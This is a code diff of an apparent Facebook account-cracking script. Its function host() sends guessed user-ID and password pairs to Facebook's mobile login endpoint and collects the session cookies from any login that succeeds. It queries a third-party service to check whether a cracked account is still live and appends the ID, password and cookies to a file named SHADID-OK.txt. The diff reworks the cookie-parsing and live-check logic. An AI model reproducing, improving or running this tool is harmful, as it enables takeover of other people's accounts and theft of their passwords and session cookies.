@@ -68,8 +68,7 @@ user = []
 # ---------lock remove function------------#
 def live_check(uid):
     chek = requests.get(f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}").text
-    if chek == "live":
-        return "live"
+    return chek
 
 
 # fb = ""  # mbasic, touch, free, m, x, p
@@ -166,21 +165,26 @@ def host(uid, pwx, meth, fb):
             url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             session.post(url=url, data=info, headers=had)
             heron_brand = session.cookies.get_dict().keys()
-            if "c_user" in heron_brand:
-                    coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
-                    xx = coki.split("c_user=")[1]
-                    xd = xx[:15].replace(";", "  ")
-                    if live_check(xd) == "live":
-                        print(f"\r\r[SUCCESSFUL] {xd} <> {ps}\n[Cookies]{coki}")
-                        open("/sdcard/SHADID-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
-                        break
-                    else:pass
-            elif "checkpoint" in heron_brand:
-                pass
+            for key in heron_brand:
+                if key == "c_user":
 
-                # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
-            else:
-                continue
+                    coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                    xx = coki.split("c_user=")[1][:15].replace(";", "  ")
+                    result = live_check(xx)
+
+                    if result == "die":
+                        pass
+                    else:
+                        print(f"\r\r[SUCCESSFUL] {xx} <> {ps}\n[Cookies]{coki}")
+                        open("/sdcard/SHADID-OK.txt", "a").write(xx + "|" + ps + "|" + coki + "\n")
+                        break
+
+                elif "checkpoint" in heron_brand:
+                    pass
+
+                    # print(f"\r\r[green] [CP-ID] {uid} | {ps}")
+                else:
+                    continue
         loop += 1
     except Exception as e:
         time.sleep(30)
